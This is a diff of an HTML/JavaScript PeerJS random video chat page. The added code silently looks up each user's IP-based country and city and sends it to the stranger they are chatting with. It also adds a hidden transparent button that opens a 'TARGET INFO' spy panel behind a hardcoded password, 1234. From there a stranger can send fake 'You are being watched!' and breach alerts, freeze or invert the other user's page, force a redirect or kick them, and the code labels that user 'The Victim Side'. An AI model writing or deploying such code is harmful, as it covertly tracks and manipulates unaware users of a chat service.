@@ -3,505 +3,437 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chat Random - Admin Control</title>
+    <title>Live Video Chat | Real Admin</title>
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
     <style>
-        /* CSS Reset & Basics */
+        /* CSS Basics */
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
         
         body { 
-            background: #111; 
+            background: #0d0d0d; 
             color: white; 
             height: 100vh; 
             display: flex; 
             flex-direction: column; 
             overflow: hidden;
-            transition: all 0.5s ease-in-out; /* حركة ناعمة عند تغيير الثيم */
+            transition: 0.3s all ease;
         }
 
         /* Login Screen */
         #loginScreen {
             flex: 1; display: flex; flex-direction: column;
-            align-items: center; justify-content: center; padding: 20px; text-align: center;
+            align-items: center; justify-content: center; padding: 20px;
         }
 
         .card {
-            background: #1e1e1e; padding: 30px; border-radius: 20px;
-            width: 100%; max-width: 400px; border: 1px solid #333;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            background: #1a1a1a; padding: 30px; border-radius: 15px;
+            width: 100%; max-width: 400px; border: 1px solid #333; text-align: center;
         }
 
-        h1 { margin-bottom: 20px; font-size: 1.5rem; color: #007aff; }
+        h1 { color: #007aff; margin-bottom: 20px; }
         
         .my-id-box {
-            background: #2a2a2a; padding: 10px; border-radius: 10px;
-            margin: 10px 0; font-size: 1.5rem; color: #777; letter-spacing: 2px;
+            background: #222; padding: 10px; margin: 15px 0; 
+            font-family: monospace; font-size: 1.4rem; border: 1px dashed #555;
+            cursor: pointer;
         }
 
         input {
-            width: 100%; padding: 15px; margin-bottom: 10px; border-radius: 10px;
-            border: 1px solid #444; background: #111; color: white; text-align: center; font-size: 1.1rem;
+            width: 100%; padding: 12px; margin-bottom: 10px; 
+            background: #111; border: 1px solid #444; color: white; text-align: center; border-radius: 5px;
         }
 
         button {
-            width: 100%; padding: 15px; border: none; border-radius: 10px;
-            font-size: 1.1rem; cursor: pointer; font-weight: bold; margin-bottom: 10px; transition: 0.2s;
+            width: 100%; padding: 12px; border: none; border-radius: 5px;
+            cursor: pointer; font-weight: bold; margin-top: 5px;
         }
-
-        .btn-connect { background: #333; color: white; }
-        .btn-connect:hover { background: #444; }
-
-        .btn-random {
-            background: linear-gradient(45deg, #ff3b30, #ff9500);
-            color: white; font-size: 1.3rem;
-            box-shadow: 0 4px 15px rgba(255, 59, 48, 0.4);
-        }
+        .btn-blue { background: #007aff; color: white; }
+        .btn-blue:hover { background: #005bb5; }
 
         /* Chat Screen */
         #chatScreen { display: none; flex-direction: column; height: 100%; }
 
         .chat-header {
-            padding: 10px; background: #1e1e1e; border-bottom: 1px solid #333;
+            padding: 10px 20px; background: #1a1a1a; border-bottom: 1px solid #333;
             display: flex; justify-content: space-between; align-items: center;
         }
 
         #videoContainer {
-            display: flex; flex-direction: row; height: 40vh;
-            background: #000; border-bottom: 4px solid #007aff;
+            display: flex; height: 50vh; background: black; border-bottom: 2px solid #007aff;
         }
         .video-box {
-            flex: 1; position: relative; border-right: 1px solid #222;
-            overflow: hidden; background: #111; display: flex; align-items: center; justify-content: center;
+            flex: 1; position: relative; border-right: 1px solid #222; overflow: hidden;
         }
-        
         video { width: 100%; height: 100%; object-fit: cover; }
-
-        .video-overlay {
-            position: absolute; top: 0; left: 0; right: 0; bottom: 0;
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            background: rgba(0,0,0,0.7); z-index: 2;
-        }
-        .spinner {
-            border: 4px solid #f3f3f3; border-top: 4px solid #007aff;
-            border-radius: 50%; width: 40px; height: 40px;
-            animation: spin 1s linear infinite; margin-bottom: 10px;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
         .label {
-            position: absolute; bottom: 10px; left: 10px;
-            background: rgba(0,0,0,0.6); padding: 4px 10px; color: white;
-            font-size: 0.9rem; border-radius: 4px; z-index: 3;
+            position: absolute; bottom: 10px; right: 10px; background: rgba(0,0,0,0.7);
+            padding: 5px 10px; font-size: 0.8rem; border-radius: 5px;
         }
 
         .messages-container {
-            flex: 1; padding: 15px; overflow-y: auto;
-            display: flex; flex-direction: column; gap: 10px; background: #181818;
+            flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px;
+        }
+        .msg { padding: 8px 12px; border-radius: 10px; max-width: 75%; font-size: 0.9rem; }
+        .msg-me { background: #007aff; align-self: flex-end; }
+        .msg-remote { background: #333; align-self: flex-start; }
+        .msg-sys { align-self: center; color: #777; font-size: 0.8rem; }
+
+        .input-area { padding: 15px; background: #1a1a1a; display: flex; gap: 10px; }
+
+        /* ================= ADMIN PANEL ================= */
+        /* الزر السري (شفاف أسفل اليسار) */
+        #secretBtn {
+            position: fixed; bottom: 0; left: 0; width: 40px; height: 40px;
+            z-index: 9999; cursor: default;
         }
 
-        .message { max-width: 80%; padding: 10px 15px; border-radius: 15px; font-size: 0.95rem; }
-        .msg-me { background: #007aff; align-self: flex-end; color: white; border-bottom-left-radius: 2px; }
-        .msg-remote { background: #333; align-self: flex-start; color: #ddd; border-bottom-right-radius: 2px; }
-        .msg-sys { align-self: center; background: none; color: #777; font-size: 0.8rem; }
-
-        .input-area { padding: 10px; background: #1e1e1e; display: flex; gap: 10px; }
-        .input-area input { margin: 0; text-align: right; }
-
-        /* ================= ADMIN & THEMES ================= */
-        
-        /* الزر السري (تم جعله مرئياً قليلاً لتعرف مكانه) */
-        #secretAdminBtn {
-            position: fixed; bottom: 5px; left: 5px; width: 20px; height: 20px;
-            background: rgba(255, 0, 0, 0.3); /* لون أحمر خفيف */
-            border-radius: 50%; z-index: 9999; cursor: pointer;
-        }
-        #secretAdminBtn:hover { background: red; }
-
-        /* نافذة الأدمن */
         #adminModal {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.95); z-index: 10000;
-            flex-direction: column; align-items: center; justify-content: center;
-            color: #0f0; font-family: 'Courier New', monospace;
-        }
-        
-        .admin-panel {
-            background: #050505; border: 1px solid #0f0; padding: 20px;
-            width: 90%; max-width: 450px; border-radius: 5px;
-            box-shadow: 0 0 20px #0f0;
+            background: rgba(0,0,0,0.9); z-index: 10000;
+            justify-content: center; align-items: center; flex-direction: column;
         }
 
-        .btn-admin {
-            background: #002200; border: 1px solid #0f0; color: #0f0;
-            padding: 10px; margin: 5px; width: 100%; font-family: monospace; 
-            cursor: pointer; text-transform: uppercase; font-weight: bold;
+        .admin-panel {
+            background: #000; border: 2px solid #00ff00; width: 90%; max-width: 500px;
+            padding: 20px; font-family: monospace; color: #00ff00;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
         }
-        .btn-admin:hover { background: #0f0; color: black; }
+
+        .admin-header { display: flex; justify-content: space-between; margin-bottom: 15px; border-bottom: 1px solid #004400; padding-bottom: 10px; }
         
+        .info-box {
+            border: 1px dashed #004400; padding: 10px; margin-bottom: 15px; background: #001100;
+        }
+        .info-row { display: flex; justify-content: space-between; margin-bottom: 5px; font-size: 0.8rem; }
+        .info-val { color: white; font-weight: bold; }
+
+        .btn-cmd {
+            background: #002200; border: 1px solid #00ff00; color: #00ff00;
+            padding: 8px; width: 100%; margin-bottom: 8px; cursor: pointer;
+            font-family: monospace; font-weight: bold; text-align: left;
+        }
+        .btn-cmd:hover { background: #00ff00; color: black; }
         .btn-kick { border-color: red; color: red; background: #220000; }
         .btn-kick:hover { background: red; color: white; }
 
-        /* === الثيمات التي سيتم تفعيلها عند الشخص الآخر === */
+        /* Themes Effects */
+        body.hacked { filter: invert(1) hue-rotate(180deg); }
+        body.frozen * { pointer-events: none; opacity: 0.5; }
         
-        /* 1. Matrix Theme */
-        body.matrix-mode { background: black !important; color: #00ff00 !important; font-family: 'Courier New', monospace !important; }
-        body.matrix-mode .card, body.matrix-mode .chat-header, body.matrix-mode .input-area { background: #001100; border-color: #00ff00; }
-        body.matrix-mode .messages-container { background: black; }
-        body.matrix-mode .message { border: 1px solid #00ff00; background: black; color: #00ff00; }
-        body.matrix-mode input { background: black; color: #00ff00; border-color: #00ff00; }
-
-        /* 2. Light Theme */
-        body.light-mode { background: #ffffff !important; color: #333333 !important; }
-        body.light-mode .card, body.light-mode .chat-header, body.light-mode .input-area { background: #f0f0f0; border-color: #ccc; }
-        body.light-mode .messages-container { background: #e5e5e5; }
-        body.light-mode .msg-remote { background: white; color: black; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        body.light-mode input { background: white; color: black; border-color: #ccc; }
-        body.light-mode h1, body.light-mode h3 { color: #007aff; }
-
-        /* 3. Error / Kicked Screen */
-        body.kicked-mode {
-            background: red !important;
-            display: flex; align-items: center; justify-content: center;
-        }
     </style>
 </head>
 <body>
 
-    <!-- الشاشة الرئيسية -->
+    <!-- 1. Login -->
     <div id="loginScreen">
         <div class="card">
-            <h1>📷 شات فيديو (مع تحكم)</h1>
-            <button class="btn-random" onclick="startRandomSearch()">🎲 بحث عشوائي (LIVE)</button>
-            <p style="color:#aaa; font-size:0.9rem">رقمك الخاص:</p>
-            <div class="my-id-box" id="myId">جاري التحميل...</div>
-            <input type="number" id="remoteIdInput" placeholder="أدخل رقم صديقك">
-            <button class="btn-connect" onclick="connectToPartner()">اتصال مباشر</button>
+            <h1>📷 Live Chat</h1>
+            <p style="color:#777; font-size:0.9rem">Your ID (Share this):</p>
+            <div class="my-id-box" id="myId">Generating...</div>
+            
+            <input type="text" id="remoteId" placeholder="Enter Friend ID">
+            <button class="btn-blue" onclick="connectManual()">Connect</button>
+            <br><br>
+            <button class="btn-blue" style="background:#333" onclick="startRandom()">🎲 Random Search</button>
         </div>
     </div>
 
-    <!-- شاشة المحادثة -->
+    <!-- 2. Chat -->
     <div id="chatScreen">
         <div class="chat-header">
-            <h3>Live Chat 🔴</h3>
-            <button class="btn-connect" style="width:auto; padding:5px 15px;" onclick="nextPartner()">⏭ التالي</button>
+            <h3>Connected 🟢</h3>
+            <button onclick="nextUser()" style="width:auto; padding:5px 15px; background:#d32f2f; color:white;">Next / Exit</button>
         </div>
 
         <div id="videoContainer">
             <div class="video-box">
                 <video id="localVideo" autoplay muted></video>
-                <div class="label">أنت</div>
+                <div class="label">You</div>
             </div>
             <div class="video-box">
-                <div id="loadingOverlay" class="video-overlay">
-                    <div class="spinner"></div>
-                    <span>جارِ البحث...</span>
+                <div id="loadingOverlay" style="position:absolute; inset:0; display:flex; align-items:center; justify-content:center; background:#000; z-index:2;">
+                    <span style="color:#777">Waiting for user...</span>
                 </div>
                 <video id="remoteVideo" autoplay></video>
-                <div class="label">الشريك</div>
+                <div class="label">Stranger</div>
             </div>
         </div>
 
-        <div class="messages-container" id="messagesList"></div>
+        <div class="messages-container" id="msgs"></div>
 
         <div class="input-area">
-            <input type="text" id="msgInput" placeholder="اكتب رسالة..." onkeypress="handleEnter(event)" disabled>
-            <button class="btn-connect" style="width: auto; margin:0;" onclick="sendMessage()">➤</button>
+            <input type="text" id="msgInput" placeholder="Type a message..." onkeypress="handleEnter(event)">
+            <button class="btn-blue" style="width:auto;" onclick="sendMsg()">➤</button>
         </div>
     </div>
 
-    <!-- ========================================= -->
-    <!-- ============== لوحة الأدمن ============= -->
-    <!-- ========================================= -->
-    
-    <!-- الزر السري (أسفل اليسار) -->
-    <div id="secretAdminBtn" onclick="openAdminAuth()"></div>
+    <!-- 3. ADMIN PANEL -->
+    <div id="secretBtn" onclick="showAdminLogin()"></div>
 
     <div id="adminModal">
-        <!-- تسجيل الدخول -->
-        <div id="adminAuthBox" style="text-align: center;">
-            <h2 style="margin-bottom:20px;">🕵️‍♂️ ADMIN ACCESS</h2>
-            <input type="password" id="adminPassInput" placeholder="Password (1234)" style="background:#000; color:#0f0; border:1px solid #0f0;">
+        <!-- Auth -->
+        <div id="adminAuth" style="text-align:center;">
+            <h2 style="color:#00ff00; margin-bottom:10px;">SYSTEM ACCESS</h2>
+            <input type="password" id="adminPass" placeholder="Enter Password" style="background:black; border:1px solid #00ff00; color:#00ff00;">
             <br>
-            <button class="btn-admin" onclick="checkAdminPass()">LOGIN</button>
-            <button class="btn-admin" onclick="closeAdmin()" style="border-color:#555; color:#777;">CANCEL</button>
+            <button class="btn-cmd" style="text-align:center;" onclick="verifyAdmin()">ENTER</button>
+            <button onclick="closeAdmin()" style="background:none; border:none; color:#555; cursor:pointer;">Close</button>
         </div>
 
-        <!-- أزرار التحكم -->
-        <div id="adminPanelContent" class="admin-panel" style="display: none;">
-            <div style="display:flex; justify-content:space-between; border-bottom:1px solid #0f0; padding-bottom:10px; margin-bottom:15px;">
-                <span>⚡ REMOTE CONTROL</span>
-                <button onclick="closeAdmin()" style="background:none; border:none; color:red; cursor:pointer; font-size:1.2rem;">X</button>
+        <!-- Dashboard -->
+        <div id="adminDash" class="admin-panel" style="display:none;">
+            <div class="admin-header">
+                <span>⚡ REAL-TIME CONTROL</span>
+                <button onclick="closeAdmin()" style="background:none; border:none; color:red; cursor:pointer;">X</button>
             </div>
 
-            <p style="color:#aaa; font-size:0.8rem; margin-bottom:10px;">User ID: <span id="adminTargetId" style="color:yellow">None</span></p>
+            <!-- Spy Info -->
+            <div class="info-box">
+                <h4 style="border-bottom:1px solid #004400; margin-bottom:5px;">👁️ TARGET INFO (REAL)</h4>
+                <div class="info-row"><span>Status:</span> <span class="info-val" id="admStatus">Idle</span></div>
+                <div class="info-row"><span>User ID:</span> <span class="info-val" id="admTargetId">---</span></div>
+                <div class="info-row"><span>IP/Country:</span> <span class="info-val" id="admCountry" style="color:yellow">Waiting...</span></div>
+                <div class="info-row"><span>Browser:</span> <span class="info-val" id="admBrowser">---</span></div>
+            </div>
 
-            <button class="btn-admin" onclick="sendCommand('THEME_MATRIX')">🎨 Force MATRIX Theme</button>
-            <button class="btn-admin" onclick="sendCommand('THEME_LIGHT')">☀️ Force LIGHT Theme</button>
-            <button class="btn-admin" onclick="sendCommand('THEME_DEFAULT')">🔄 Reset Theme</button>
-            
-            <div style="height:1px; background:#333; margin:15px 0;"></div>
-            
-            <button class="btn-admin btn-kick" onclick="sendCommand('KICK')">☠️ KICK USER NOW</button>
+            <!-- Commands -->
+            <button class="btn-cmd" onclick="cmd('ALERT')">📢 Send Real Alert</button>
+            <button class="btn-cmd" onclick="cmd('THEME_HACK')">🎨 Change to HACKED Mode</button>
+            <button class="btn-cmd" onclick="cmd('REDIRECT')">🔗 Force Redirect (Google)</button>
+            <button class="btn-cmd" onclick="cmd('FREEZE')">❄️ Freeze Their Browser</button>
+            <hr style="border-color:#004400; margin:10px 0;">
+            <button class="btn-cmd btn-kick" onclick="cmd('KICK')">☠️ KICK USER (Force Reload)</button>
         </div>
     </div>
 
     <script>
-        const minID = 10000;
-        const maxID = 99999; 
-        const myNum = Math.floor(Math.random() * (maxID - minID + 1) + minID).toString();
+        // --- Configuration ---
+        const myId = Math.floor(10000 + Math.random() * 90000).toString();
+        document.getElementById('myId').innerText = myId;
         
-        document.getElementById('myId').innerText = myNum;
-
-        let peer;
-        let conn;
-        let call;
-        let localStream;
+        let peer = new Peer(myId);
+        let conn = null;
+        let call = null;
+        let localStream = null;
         let isSearching = false;
 
-        peer = new Peer(myNum);
+        // --- Get Real Info (To send to admin) ---
+        let myRealInfo = { country: "Unknown", browser: navigator.userAgent };
+        
+        // Fetch real location from free API
+        fetch('https://ipapi.co/json/')
+            .then(res => res.json())
+            .then(data => {
+                myRealInfo.country = data.country_name || "Unknown";
+                myRealInfo.city = data.city || "Unknown";
+            }).catch(e => console.log("IP Info blocked by adblocker"));
 
-        peer.on('open', id => { console.log('My ID:', id); });
+        // --- Peer Events ---
+        peer.on('open', id => console.log('My ID:', id));
 
-        // استقبال الاتصال (شات وأوامر)
         peer.on('connection', connection => {
-            if(conn && conn.open) return; 
+            if(conn && conn.open) { connection.close(); return; }
             conn = connection;
-            setupDataConnection(); // تفعيل استقبال البيانات
-            updateAdminTarget(conn.peer);
+            setupConn();
         });
 
-        // استقبال الفيديو
         peer.on('call', incomingCall => {
-            navigator.mediaDevices.getUserMedia({video: true, audio: true}).then(stream => {
+            navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(stream => {
                 localStream = stream;
                 document.getElementById('localVideo').srcObject = stream;
-                
                 incomingCall.answer(stream);
                 call = incomingCall;
-                
-                call.on('stream', remoteStream => {
-                    document.getElementById('remoteVideo').srcObject = remoteStream;
+                call.on('stream', rs => {
+                    document.getElementById('remoteVideo').srcObject = rs;
+                    document.getElementById('loadingOverlay').style.display = 'none';
                 });
-                
-                switchToChatScreen();
-                stopSearchingUI();
+                goToChat();
             });
         });
 
-        peer.on('error', err => {
-            if (isSearching) setTimeout(searchRandomLogic, 1000); 
-        });
-
-        // ================= الوظائف الأساسية =================
-
-        function startRandomSearch() {
-            switchToChatScreen();
-            startSearchingUI();
-            navigator.mediaDevices.getUserMedia({video: true, audio: true}).then(stream => {
+        // --- Logic ---
+        function startRandom() {
+            goToChat();
+            isSearching = true;
+            document.getElementById('loadingOverlay').style.display = 'flex';
+            
+            navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(stream => {
                 localStream = stream;
                 document.getElementById('localVideo').srcObject = stream;
-                isSearching = true;
-                searchRandomLogic();
-            }).catch(e => { alert("Camera access needed"); location.reload(); });
+                searchLoop();
+            }).catch(e => alert("Camera Required!"));
         }
 
-        function searchRandomLogic() {
-            if (!isSearching) return;
-            const randomTarget = Math.floor(Math.random() * (maxID - minID + 1) + minID).toString();
-            if (randomTarget === myNum) return searchRandomLogic();
+        function searchLoop() {
+            if(!isSearching) return;
+            let randomId = Math.floor(10000 + Math.random() * 90000).toString();
+            if(randomId === myId) return searchLoop();
 
-            let tempConn = peer.connect(randomTarget);
+            console.log("Trying:", randomId);
+            let tempConn = peer.connect(randomId);
+            
+            // If connected
             tempConn.on('open', () => {
                 isSearching = false;
                 conn = tempConn;
-                setupDataConnection(); // تفعيل استقبال البيانات
-                updateAdminTarget(conn.peer);
-
-                call = peer.call(randomTarget, localStream);
-                call.on('stream', rs => document.getElementById('remoteVideo').srcObject = rs);
-                stopSearchingUI();
+                setupConn();
+                call = peer.call(randomId, localStream);
+                call.on('stream', rs => {
+                    document.getElementById('remoteVideo').srcObject = rs;
+                    document.getElementById('loadingOverlay').style.display = 'none';
+                });
             });
+
+            // If error (not found), try again
+            peer.on('error', err => {
+                if(isSearching) setTimeout(searchLoop, 500);
+            });
+            // Manual timeout fallback
+            setTimeout(() => { if(isSearching && !conn) searchLoop(); }, 1500);
         }
 
-        function connectToPartner() {
-            const remoteId = document.getElementById('remoteIdInput').value;
-            if(!remoteId) return alert("Enter ID");
+        function connectManual() {
+            let id = document.getElementById('remoteId').value;
+            if(!id) return alert("Enter ID");
+            goToChat();
             
-            navigator.mediaDevices.getUserMedia({video: true, audio: true}).then(stream => {
+            navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(stream => {
                 localStream = stream;
                 document.getElementById('localVideo').srcObject = stream;
-                
-                conn = peer.connect(remoteId);
+                conn = peer.connect(id);
                 conn.on('open', () => {
-                    setupDataConnection();
-                    updateAdminTarget(remoteId);
-                    
-                    call = peer.call(remoteId, stream);
-                    call.on('stream', rs => document.getElementById('remoteVideo').srcObject = rs);
-                    switchToChatScreen();
-                    stopSearchingUI();
+                    setupConn();
+                    call = peer.call(id, stream);
+                    call.on('stream', rs => {
+                        document.getElementById('remoteVideo').srcObject = rs;
+                        document.getElementById('loadingOverlay').style.display = 'none';
+                    });
                 });
             });
         }
 
-        // ====================================================
-        // 🔥🔥 القلب النابض: معالجة البيانات والأوامر 🔥🔥
-        // ====================================================
+        function setupConn() {
+            updateAdminStatus("Connected", conn.peer);
+            
+            // 1. Send my REAL info to the other person (Secretly)
+            conn.send({ type: 'INFO', data: myRealInfo });
 
-        function setupDataConnection() {
+            // 2. Listen for data
             conn.on('data', data => {
-                console.log("Received data:", data); // للمراقبة
-
-                // التحقق مما إذا كانت البيانات "أمر أدمن"
-                // الكود السري هو: $$CMD:
-                if (typeof data === 'string' && data.startsWith("$$CMD:")) {
-                    const command = data.split(":")[1]; // استخراج الأمر
-                    executeRemoteCommand(command);
-                } 
-                else {
-                    // رسالة شات عادية
-                    addMessage(data, 'remote');
+                if(data.type === 'CMD') {
+                    executeRealCommand(data.action);
+                } else if (data.type === 'INFO') {
+                    // Received remote user info for admin panel
+                    updateAdminInfo(data.data);
+                } else {
+                    addMsg(data, 'remote');
                 }
             });
 
             conn.on('close', () => {
                 conn = null;
-                addSystemMsg("تم قطع الاتصال.");
+                alert("Connection lost");
+                location.reload();
             });
         }
 
-        // 🟢 تنفيذ الأوامر عند الضحية (المستقبل)
-        function executeRemoteCommand(cmd) {
-            console.log("EXECUTING COMMAND:", cmd);
+        // --- REAL COMMAND EXECUTION (The Victim Side) ---
+        function executeRealCommand(action) {
+            console.log("Executing Admin Command:", action);
             
-            if (cmd === 'THEME_MATRIX') {
-                document.body.className = 'matrix-mode';
-                addSystemMsg("⚠️ SYSTEM: Matrix Protocol Initiated...");
+            if(action === 'KICK') {
+                document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:20%'>⛔ KICKED BY ADMIN</h1>";
+                setTimeout(() => location.reload(), 1500);
             }
-            else if (cmd === 'THEME_LIGHT') {
-                document.body.className = 'light-mode';
-                addSystemMsg("⚠️ SYSTEM: Flashbang Initiated...");
+            else if (action === 'ALERT') {
+                alert("⚠️ SYSTEM WARNING: You are being watched!");
             }
-            else if (cmd === 'THEME_DEFAULT') {
-                document.body.className = '';
-                addSystemMsg("ℹ️ SYSTEM: Theme Reset.");
+            else if (action === 'THEME_HACK') {
+                document.body.classList.add('hacked');
+                alert("⚠️ SECURITY BREACH DETECTED");
             }
-            else if (cmd === 'KICK') {
-                // الطرد النهائي
-                document.body.innerHTML = '<h1 style="color:white; font-size:3rem; text-align:center; margin-top:20%">⛔<br>YOU HAVE BEEN KICKED<br>BY ADMIN</h1>';
-                document.body.style.background = 'red';
-                // قطع الاتصال
-                if(conn) conn.close();
-                if(call) call.close();
-                // إعادة التحميل بعد ثانية ونصف
-                setTimeout(() => location.reload(), 2000);
+            else if (action === 'REDIRECT') {
+                window.location.href = "https://www.google.com";
+            }
+            else if (action === 'FREEZE') {
+                document.body.classList.add('frozen');
+                document.getElementById('msgInput').disabled = true;
             }
         }
 
-        // 🔴 إرسال الأوامر من الأدمن (المرسل)
-        function sendCommand(type) {
+        // --- ADMIN SENDING (The Admin Side) ---
+        function cmd(action) {
             if(conn && conn.open) {
-                // نرسل النص مع البادئة السرية
-                conn.send("$$CMD:" + type);
+                conn.send({ type: 'CMD', action: action });
+                alert("Command Sent: " + action);
                 
-                // تطبيق التأثير محلياً أيضاً لترى ما يحدث
-                if (type !== 'KICK') {
-                    executeRemoteCommand(type);
-                } else {
-                    addSystemMsg("🚫 SENDING KICK COMMAND...");
-                    setTimeout(() => {
-                        conn.close();
-                        location.reload();
-                    }, 1000);
+                // If kick, close locally too
+                if(action === 'KICK') {
+                    setTimeout(() => location.reload(), 1000);
                 }
             } else {
-                alert("You are not connected to anyone!");
+                alert("No active user connected!");
             }
         }
 
-        // ====================================================
-
-        function sendMessage() {
-            const input = document.getElementById('msgInput');
-            const msg = input.value;
-            if(msg && conn && conn.open) {
-                conn.send(msg); // إرسال عادي بدون بادئة
-                addMessage(msg, 'me');
-                input.value = '';
-            }
-        }
-
-        function openAdminAuth() {
-            document.getElementById('adminModal').style.display = 'flex';
-            document.getElementById('adminAuthBox').style.display = 'block';
-            document.getElementById('adminPanelContent').style.display = 'none';
-        }
-
-        function closeAdmin() {
-            document.getElementById('adminModal').style.display = 'none';
-            document.getElementById('adminPassInput').value = '';
-        }
-
-        function checkAdminPass() {
-            if(document.getElementById('adminPassInput').value === "1234") {
-                document.getElementById('adminAuthBox').style.display = 'none';
-                document.getElementById('adminPanelContent').style.display = 'block';
-            } else {
-                alert("خطأ في كلمة المرور");
-            }
+        function updateAdminInfo(info) {
+            document.getElementById('admCountry').innerText = (info.country || "Unknown") + " / " + (info.city || "");
+            document.getElementById('admBrowser').innerText = "Detected";
         }
         
-        function updateAdminTarget(id) {
-            document.getElementById('adminTargetId').innerText = id;
+        function updateAdminStatus(status, id) {
+            document.getElementById('admStatus').innerText = status;
+            document.getElementById('admTargetId').innerText = id;
         }
 
-        function switchToChatScreen() {
+        // --- UI Utils ---
+        function goToChat() {
             document.getElementById('loginScreen').style.display = 'none';
             document.getElementById('chatScreen').style.display = 'flex';
         }
 
-        function startSearchingUI() {
-            document.getElementById('loadingOverlay').style.display = 'flex';
-            document.getElementById('remoteVideo').srcObject = null;
-            document.getElementById('msgInput').disabled = true;
-        }
-
-        function stopSearchingUI() {
-            document.getElementById('loadingOverlay').style.display = 'none';
-            document.getElementById('msgInput').disabled = false;
-        }
-
-        function nextPartner() {
+        function nextUser() {
             if(conn) conn.close();
             if(call) call.close();
-            conn = null;
-            call = null;
-            document.getElementById('messagesList').innerHTML = '';
-            document.body.className = ''; // إعادة تعيين الثيم عند البحث عن جديد
-            isSearching = true;
-            startSearchingUI();
-            searchRandomLogic();
+            location.reload();
         }
 
-        function addMessage(msg, type) {
-            const container = document.getElementById('messagesList');
-            const div = document.createElement('div');
-            div.className = 'message ' + (type === 'me' ? 'msg-me' : 'msg-remote');
-            div.innerText = msg;
-            container.appendChild(div);
-            container.scrollTop = container.scrollHeight;
+        function sendMsg() {
+            let input = document.getElementById('msgInput');
+            let txt = input.value;
+            if(txt && conn) {
+                conn.send(txt);
+                addMsg(txt, 'me');
+                input.value = '';
+            }
         }
 
-        function addSystemMsg(txt) {
-            const container = document.getElementById('messagesList');
-            const div = document.createElement('div');
-            div.className = 'message msg-sys';
+        function addMsg(txt, type) {
+            let div = document.createElement('div');
+            div.className = 'msg ' + (type === 'me' ? 'msg-me' : 'msg-remote');
             div.innerText = txt;
-            container.appendChild(div);
-            container.scrollTop = container.scrollHeight;
+            document.getElementById('msgs').appendChild(div);
         }
+        function handleEnter(e) { if(e.key === 'Enter') sendMsg(); }
 
-        function handleEnter(e) { if(e.key === 'Enter') sendMessage(); }
+        // --- Admin Auth ---
+        function showAdminLogin() {
+            document.getElementById('adminModal').style.display = 'flex';
+            document.getElementById('adminAuth').style.display = 'block';
+            document.getElementById('adminDash').style.display = 'none';
+        }
+        function closeAdmin() {
+            document.getElementById('adminModal').style.display = 'none';
+            document.getElementById('adminPass').value = '';
+        }
+        function verifyAdmin() {
+            if(document.getElementById('adminPass').value === '1234') {
+                document.getElementById('adminAuth').style.display = 'none';
+                document.getElementById('adminDash').style.display = 'flex';
+            } else {
+                alert("Access Denied");
+            }
+        }
 
     </script>
 </body>
